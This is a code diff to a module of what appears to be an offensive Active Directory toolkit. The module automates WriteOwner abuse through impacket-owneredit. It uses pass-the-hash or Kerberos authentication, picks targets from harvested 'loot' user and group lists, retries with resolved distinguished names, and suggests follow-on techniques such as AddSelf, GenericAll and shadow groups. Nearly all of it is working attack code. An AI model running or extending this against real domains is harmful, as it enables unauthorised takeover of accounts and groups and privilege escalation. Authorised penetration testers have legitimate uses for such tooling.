@@ -1,12 +1,26 @@
 # modules/writeowner.py
 
+import os
 from core.colors import red, green, blue, yellow
-from core.helpers import run_command
+from core.helpers import run_command, select_from_list
 
-def attack_write_owner(session, target_object, new_owner):
-    print(blue(f"[*] Attempting to set owner of '{target_object}' to '{new_owner}' using impacket-owneredit..."))
+def attack_write_owner(session, *parts):
+    print(blue("[*] Attempting to set object owner using impacket-owneredit..."))
 
-    # === Build command based on auth method ===
+    target_object = parts[0] if len(parts) >= 1 else None
+    new_owner = parts[1] if len(parts) >= 2 else None
+
+    if not target_object:
+        target_object = _prompt_object("Select target object (user/group/computer):")
+
+    if not new_owner:
+        new_owner = _prompt_object("Select new owner (user/group):")
+
+    # === First attempt using short names as-is ===
+    _attempt_owneredit(session, target_object, new_owner, fallback=True)
+
+
+def _attempt_owneredit(session, target_object, new_owner, fallback=False):
     if session.hash:
         auth = f"{session.domain}/{session.username} -hashes :{session.hash}"
     elif session.password:
@@ -15,34 +29,83 @@ def attack_write_owner(session, target_object, new_owner):
         auth = f"{session.domain}/{session.username} -k -no-pass"
 
     cmd = (
-        f"impacket-owneredit -action write -new-owner {new_owner} "
-        f"-target '{target_object}' {auth} -dc-ip {session.dc_ip }"
+        f"impacket-owneredit -action write -new-owner \"{new_owner}\" "
+        f"-target \"{target_object}\" {auth} -dc-ip {session.dc_ip}"
     )
 
-    # === Run command ===
+    print(blue(f"[*] Running: {cmd}"))
     out, err = run_command(cmd)
-    combined_output = (out + "\n" + err)
+    combined = out + "\n" + err
 
-    # --- Success detection ---
-    if any(kw in combined_output.lower() for kw in ["owner set", "success", "modified"]):
-        print(green(f"[+] WriteOwner succeeded:\n"))
+    # === Success
+    if any(x in combined.lower() for x in ["owner set", "successfully", "modified"]):
+        print(green("[+] WriteOwner succeeded:\n"))
         print(green(out.strip()))
         return
 
-    # --- Current owner info ---
-    if "Current owner information below" in combined_output:
+    # === Partial output fallback
+    if "Current owner information below" in combined:
         print(yellow("[*] Current owner information below"))
-        for line in combined_output.splitlines():
+        for line in combined.splitlines():
             if any(tag in line for tag in ["SID:", "sAMAccountName:", "distinguishedName:"]):
                 print(yellow(line.strip()))
 
-    # --- Constraint error detection ---
-    if "0000051B" in combined_output or "constraint_att_type" in combined_output.lower():
+    # === Constraint failure
+    if "0000051B" in combined or "constraint_att_type" in combined.lower():
         print(red("[-] WriteOwner blocked by AD schema constraint (error 0000051B)."))
-        print(yellow("[!] This often means you’re not allowed to set owner on this object directly."))
-        print(yellow("[!] Consider trying via 'GenericAll' or using a shadow group instead."))
+        print(yellow("[!] Try AddSelf + GenericAll or shadow group techniques."))
         return
 
-    # --- General failure ---
-    print(red("[-] WriteOwner may have failed:"))
-    print(red(err if err else out))
+    # === Generic failure, fallback to full DN input
+    print(red("[!] WriteOwner may have failed."))
+
+    if fallback:
+        print(yellow("[*] Attempting fallback by resolving both values to full DNs..."))
+        resolved_target = _resolve_to_dn(target_object)
+        resolved_owner = _resolve_to_dn(new_owner)
+        if resolved_target and resolved_owner:
+            _attempt_owneredit(session, resolved_target, resolved_owner, fallback=False)
+        else:
+            print(red("[-] Could not resolve to full DNs. Aborting."))
+    else:
+        print(red(err if err else out))
+
+
+# ===================
+# HELPERS
+# ===================
+
+def _prompt_object(prompt_msg):
+    print(blue(f"[*] {prompt_msg}"))
+    users, groups = _load_loot_users_groups()
+    candidates = users + groups
+
+    if not candidates:
+        return input("[?] Enter full DN or short name: ").strip()
+
+    return select_from_list(candidates, "Choose object:")
+
+def _resolve_to_dn(value):
+    if value.upper().startswith("CN=") and "DC=" in value.upper():
+        return value
+
+    users, groups = _load_loot_users_groups()
+    all_dn = users + groups
+    val_lower = value.lower()
+
+    for dn in all_dn:
+        if f"CN={val_lower}" in dn.lower():
+            return dn
+
+    print(yellow(f"[!] Could not resolve '{value}' to DN."))
+    return input("[?] Enter full DN manually: ").strip()
+
+def _load_loot_users_groups():
+    users, groups = [], []
+    if os.path.exists("loot/valid_users.txt"):
+        with open("loot/valid_users.txt", "r") as f:
+            users = [line.strip() for line in f if line.strip()]
+    if os.path.exists("loot/groups.txt"):
+        with open("loot/groups.txt", "r") as f:
+            groups = [line.strip() for line in f if line.strip()]
+    return users, groups
